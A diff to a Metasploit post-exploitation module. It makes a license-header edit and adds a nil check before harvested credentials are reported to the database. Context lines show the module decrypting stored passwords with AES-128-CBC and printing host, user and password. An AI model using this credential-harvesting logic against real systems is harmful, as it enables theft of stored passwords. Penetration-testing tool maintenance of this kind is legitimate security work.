@@ -6,8 +6,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -87,11 +87,16 @@ class Metasploit3 < Msf::Post
 			pass=decrypt(decoded, @secret , iv, "AES-128-CBC")
 			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")
 			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
+			if session.db_record
+				source_id = session.db_record.id
+			else
+				source_id = nil
+			end
 			report_auth_info(
 				:host  => host,
 				:port => port,
 				:sname => proto,
-				:source_id => session.db_record.id,
+				:source_id => source_id,
 				:source_type => "exploit",
 				:user => user,
 				:pass => pass)
